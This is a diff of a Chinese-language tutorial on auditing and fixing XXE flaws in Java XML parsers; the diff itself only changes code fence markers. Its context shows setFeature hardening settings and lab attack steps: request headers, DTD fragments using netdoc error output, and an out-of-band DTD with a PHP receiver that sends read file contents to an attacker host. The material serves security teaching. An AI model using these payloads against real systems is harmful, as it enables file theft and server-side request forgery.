@@ -10,7 +10,7 @@ XXE 全称 XML 外部**实体注入**，是一种安全漏洞：当 XML 解析�
 
 ## 1.漏洞成因
 
-```plain
+```
 XML全称EXtensible Markup Language
 XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素
 DTD可以在XML文档内声明,也可以外部引用
@@ -24,7 +24,7 @@ DTD可以在XML文档内声明,也可以外部引用
 
 ## 2.审计策略
 
-```plain
+```
 XML解析涉及的业务功能点:
 WebService接口
 RESTful接口
@@ -34,12 +34,12 @@ Soap协议
 等...
 ```
 
-```plain
+```
 漏洞触发点就在XML解析时
 因此审计的重点是先看是否设置了相关的安全属性,查看是否了禁用DTDs或者禁止使用外部实体
 ```
 
-```plain
+```
 想找XXE的时候可以找找这些类的,输入点,是否外部可控
 
 java.beans.XMLDecoder
@@ -69,11 +69,11 @@ javax.xml.xpath.XPathExpression
 
 ## 3.修复方法
 
-```plain
+```
 大多数情况下,这些组件,都可以通过setFeature()方法来控制解析器的行为
 ```
 
-```plain
+```
 // 这是优先选择
 // 不允许DTDs(doctypes),几乎可以阻止所有的XML实体攻击
 setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
@@ -85,7 +85,7 @@ setFeature("http://xml.org/sax/features/external-general-entities", false);
 setFeature("http://xml.org/sax/features/external-parameter-entities", false);
 ```
 
-```plain
+```
 例如-这样设置就可以修复:
 DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
 dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
@@ -107,13 +107,13 @@ builder.setFeature("http://xml.org/sax/features/external-parameter-entities", fa
 
 ## 4.案例
 
-```plain
+```
 能造成XXE的组件很多,这里就列举一个常用的,进行案例展示
 ```
 
 ## 4.1测试环境目录
 
-```plain
+```
 // 目录结构
 ├── src
 │ ├── main
@@ -138,7 +138,7 @@ builder.setFeature("http://xml.org/sax/features/external-parameter-entities", fa
 ## 4.2 DocumentBuilderFactory
 ### 4.2.1 漏洞环境搭建
 
-```plain
+```
 // 第一步
 // 创建111.txt
 // 目录: ./SpringMVCtest/src/main/webapp/111.txt
@@ -193,7 +193,7 @@ builder.setFeature("http://xml.org/sax/features/external-parameter-entities", fa
 
 ### 4.2.2 攻击利用-回显-1
 
-```plain
+```
 // 攻击数据包-1
 POST /SpringMVCtest_war/xxe/DocumentBuilderFactory-XXE-TEST.jsp HTTP/1.1
 Host: 127.0.0.1:8081
@@ -211,7 +211,7 @@ data=<?xml version="1.0" encoding="UTF-8" ?>
 
 
 
-```plain
+```
 // 攻击数据包-2
 POST /SpringMVCtest_war/xxe/DocumentBuilderFactory-XXE-TEST.jsp HTTP/1.1
 Host: 127.0.0.1:8081
@@ -230,19 +230,19 @@ data=<?xml version="1.0" encoding="UTF-8" ?>
 
 ### 4.2.3 攻击利用-回显-2
 
-```plain
+```
 还有一种回显的方式,假设它遇到错误的时候会把错误返回给前端时,这种时候就可以使用该方法进行回显了
 
 原理就是外部实体使用netdoc协议,这时数据已经读取完毕了,但netdoc协议找不到文件,然后爆错输出数据
 ```
 
-```plain
+```
 // 模拟情景
 A服务器: 攻击方-域名:http://192.168.24.145
 B服务器: 受害者-域名:http://10.33.250.56:8081
 ```
 
-```plain
+```
 // 第一步
 // 对象: 攻击方
 // 创建一个1.dtd,能让外部访问到
@@ -252,7 +252,7 @@ B服务器: 受害者-域名:http://10.33.250.56:8081
 <!ENTITY % int "<!ENTITY &#37; send SYSTEM 'netdoc://a.b.c%data;'>">
 ```
 
-```plain
+```
 // 第二步
 // 对象: 受害者
 // 测试数据包
@@ -274,19 +274,19 @@ data=<?xml version="1.0" encoding="UTF-8" ?>
 
 ### 4.2.4 攻击利用-无回显
 
-```plain
+```
 无回显的的话则需要将文件读取的内容发送到我们的远程服务器上
 
 注意: 这个方式并不好用,只能读取不带特殊字符的内容,不然就会爆错,所以不是很好用
 ```
 
-```plain
+```
 // 模拟情景
 A服务器: 攻击方-域名:http://192.168.24.145
 B服务器: 受害者-域名:http://10.33.250.56:8081
 ```
 
-```plain
+```
 // 第一步
 // 对象: 攻击方
 // 在A服务器建立php文件接收数据 
@@ -296,7 +296,7 @@ file_put_contents('xxe_data.txt', $_GET['xxe_local']);
 ?>
 ```
 
-```plain
+```
 // 第二步
 // 对象: 攻击方
 // 创建一个2.dtd,能让外部访问到
@@ -306,7 +306,7 @@ file_put_contents('xxe_data.txt', $_GET['xxe_local']);
 <!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://192.168.24.145/get.php?xxe_local=%data;'>">
 ```
 
-```plain
+```
 // 第三步
 // 对象: 受害者
 // 测试数据包
@@ -337,7 +337,7 @@ A服务器
 
 ### 4.2.5 攻击利用-XML-SSRF
 
-```plain
+```
 // 攻击数据包-1
 // 请求DNSLOG
 POST /SpringMVCTest2_war/xxe/DocumentBuilderFactory-XXE-TEST.jsp HTTP/1.1
